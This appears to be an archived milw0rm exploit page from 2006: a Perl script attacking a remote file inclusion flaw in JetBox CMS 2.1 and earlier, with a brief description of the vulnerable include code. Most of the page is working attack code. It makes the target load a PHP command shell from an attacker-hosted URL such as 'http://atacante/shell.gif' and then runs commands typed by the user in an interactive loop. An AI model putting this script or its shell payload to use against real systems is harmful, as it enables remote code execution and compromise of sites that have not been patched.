<html><head><title>Jetbox CMS <= 2.1 (relative_script_path) Remote File Inclusion Exploit</title></head><pre>#!/usr/bin/perl
############
# JetBox CMS Remote File Include
# Exploit &amp; Advisorie:  beford &lt;xbefordx gmail com&gt;
#
# uso:# 	perl own.pl &lt;host&gt; &lt;cmd-shell-url&gt; &lt;cmd-var&gt;
# 		perl own.pl http://host.com/jet/ http://atacante/shell.gif cmd
#
# cmd shell example: &lt;? system($cmd); ?&gt;
# cmd variable: cmd;
#
#############
# Description
###########
# Vendor: http://jetbox.streamedge.com/
# The file jetbox/includes/phpdig/includes/config.php uses the variable 
# relative_script_path in a include() function without being declared. 
# This issue has already been fixed in phpdig, but jetbox still uses a 
# vulnerable version.
############
# Vuln code
############
#if (is_file(&quot;$relative_script_path/locales/$phpdig_language-language.php&quot;))
#    {include &quot;$relative_script_path/locales/$phpdig_language-language.php&quot;;}
#else
#    {include &quot;$relative_script_path/locales/en-language.php&quot;;}
############

use LWP::UserAgent;

$Path = $ARGV[0];
$Pathtocmd = $ARGV[1];
$cmdv = $ARGV[2];
if($Path!~/http:\/\// || $Pathtocmd!~/http:\/\// || !$cmdv) { usage(); }
head();
while()
{
	print &quot;[shell] \$&quot;;
	while(&lt;STDIN&gt;)      {
		$cmd=$_;
		chomp($cmd);
		if (!$cmd) {last;}  
		$xpl = LWP::UserAgent-&gt;new() or die;
		$req = HTTP::Request-&gt;new(GET =&gt;$Path.'includes/phpdig/includes/config.php?relative_script_path='.$Pathtocmd.'?&amp;'.$cmdv.'='.$cmd)or die &quot;\nCould Not connect\n&quot;;
		$res = $xpl-&gt;request($req);
		$return = $res-&gt;content;
		$return =~ tr/[\n]/[ê]/;
		
		if ($return =~/Error: HTTP request failed!/ ) {
			print &quot;\nInvalid path for phpshell\n&quot;;
			exit;
		} elsif ($return =~/^&lt;br.\/&gt;.&lt;b&gt;Fatal.error/) {
			print &quot;\nComando Invalido, o no hubo respuesta\n\n&quot;;
		}
		if ($return =~ /(.*)/) {
			$finreturn = $1;
			$finreturn=~ tr/[ê]/[\n]/;
			print &quot;\r\n$finreturn\n\r&quot;;
			last;
		} else {
			print &quot;[shell] \$&quot;;
		}

	}

} last;

sub head()  { 
	 print &quot;\n============================================================================\r\n&quot;;
	 print &quot; JetBox CMS Remote File Include\r\n&quot;;
	 print &quot;============================================================================\r\n&quot;;
 }
 
sub usage() {
	 head();
	 print &quot; Usage: perl own.pl &lt;host&gt; &lt;url-cmd&gt; &lt;var&gt;\r\n\n&quot;;
	 print &quot; &lt;host&gt; - Full Path : http://host/jetbox/ [remember the trailing slash noob]\r\n&quot;;
	 print &quot; &lt;url-cmd&gt; - PhpShell : http://atacate/shell.gif \r\n&quot;;
	 print &quot; &lt;var&gt; - var name used in phpshell : cmd  \r\n&quot;;
	 exit();
 }

# milw0rm.com [2006-05-07]</pre></html>